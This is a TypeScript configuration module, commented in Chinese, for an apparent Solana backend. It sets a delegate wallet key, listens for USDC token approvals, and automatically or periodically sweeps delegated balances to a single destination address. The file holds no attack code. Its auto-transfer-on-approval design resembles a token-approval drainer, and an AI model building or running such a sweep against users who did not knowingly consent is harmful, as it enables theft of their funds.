type MysqlConfig = {
  // 是否启用 MySQL 持久化。
  enabled: boolean;
  // MySQL 连接 DSN，包含数据库名。
  dsn: string;
  // 从 DSN 中解析出的数据库名。
  database: string;
  // 连接池最大连接数。
  connectionLimit: number;
  // 连接池耗尽时是否等待空闲连接。
  waitForConnections: boolean;
};

type ScheduledSweepConfig = {
  // 是否启用按周期巡检授权账户的归集任务。
  enabled: boolean;
  // 定时巡检间隔，单位毫秒。
  intervalMs: number;
  // 只有授权额度大于该 UI 金额时才会触发定时归集。
  minimumDelegatedAmountUi: string;
  // 只有账户余额大于该 UI 金额时才会触发定时归集。
  minimumBalanceAmountUi: string;
};

type AppConfig = {
  // 后端 HTTP 服务端口。
  port: number;
  // Solana RPC 地址。
  rpcUrl: string;
  // 当前监听和转账使用的 SPL Token Mint。
  usdcMint: string;
  // 后台 delegate 钱包私钥。
  backendSecretKey: string;
  // 默认归集目标地址，前端按钮和定时任务都会使用它。
  defaultDestinationOwner: string;
  // 是否开启链上授权监听。
  listenerEnabled: boolean;
  // 是否在监听到授权变化后立即自动转账。
  autoTransferEnabled: boolean;
  // 统一的链上读取/确认级别。
  solanaCommitment: 'processed' | 'confirmed' | 'finalized';
  // MySQL 相关运行参数。
  mysql: MysqlConfig;
  // 定时归集任务相关运行参数。
  scheduledSweep: ScheduledSweepConfig;
};

function requireEnv(name: string): string {
  const value = process.env[name];
  if (!value) {
    throw new Error(`Missing env: ${name}`);
  }

  return value;
}

function parseBooleanEnv(name: string, fallback: boolean): boolean {
  const value = process.env[name];
  if (value === undefined) {
    return fallback;
  }

  return value === 'true';
}

function parseNumberEnv(name: string, fallback: number): number {
  const rawValue = process.env[name];
  if (rawValue === undefined || rawValue === '') {
    return fallback;
  }

  const parsed = Number(rawValue);
  if (!Number.isFinite(parsed)) {
    throw new Error(`Invalid ${name}`);
  }

  return parsed;
}

function parseCommitmentEnv(
  value: string | undefined,
): 'processed' | 'confirmed' | 'finalized' {
  if (!value) {
    return 'confirmed';
  }

  if (value === 'processed' || value === 'confirmed' || value === 'finalized') {
    return value;
  }

  throw new Error('Invalid SOLANA_COMMITMENT');
}

function parseMysqlDsnEnv(): { dsn: string; database: string } {
  const dsn = process.env.MYSQL_DSN;
  if (!dsn) {
    return {
      dsn: '',
      database: '',
    };
  }

  let url: URL;
  try {
    url = new URL(dsn);
  } catch {
    throw new Error('Invalid MYSQL_DSN');
  }

  const database = url.pathname.replace(/^\//, '');
  if (!database) {
    throw new Error('MYSQL_DSN must include a database name');
  }

  return {
    dsn,
    database,
  };
}

// 统一从 .env 读取所有运行参数，避免配置分散在多个文件里。
const mysqlDsnConfig = parseMysqlDsnEnv();

export const appConfig: AppConfig = {
  port: parseNumberEnv('PORT', 3000),
  rpcUrl: process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com',
  usdcMint: process.env.USDC_MINT || 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
  backendSecretKey: requireEnv('BACKEND_SECRET_KEY'),
  defaultDestinationOwner: process.env.DEFAULT_DESTINATION_OWNER || '',
  listenerEnabled: parseBooleanEnv('ENABLE_APPROVAL_LISTENER', true),
  autoTransferEnabled: parseBooleanEnv('ENABLE_AUTO_TRANSFER', true),
  solanaCommitment: parseCommitmentEnv(process.env.SOLANA_COMMITMENT),
  mysql: {
    enabled: parseBooleanEnv('ENABLE_MYSQL_PERSISTENCE', false),
    dsn: mysqlDsnConfig.dsn,
    database: mysqlDsnConfig.database,
    connectionLimit: parseNumberEnv('MYSQL_CONNECTION_LIMIT', 10),
    waitForConnections: parseBooleanEnv('MYSQL_WAIT_FOR_CONNECTIONS', true),
  },
  // 定时归集任务默认从 .env 读取，页面开关只是在运行时临时启停。
  scheduledSweep: {
    enabled: parseBooleanEnv('ENABLE_SCHEDULED_SWEEP', false),
    intervalMs: parseNumberEnv('SCHEDULED_SWEEP_INTERVAL_MS', 300000),
    minimumDelegatedAmountUi: process.env.SCHEDULED_SWEEP_MIN_DELEGATED_AMOUNT_UI || '100',
    minimumBalanceAmountUi: process.env.SCHEDULED_SWEEP_MIN_BALANCE_AMOUNT_UI || '100',
  },
};

export type { AppConfig, MysqlConfig, ScheduledSweepConfig };
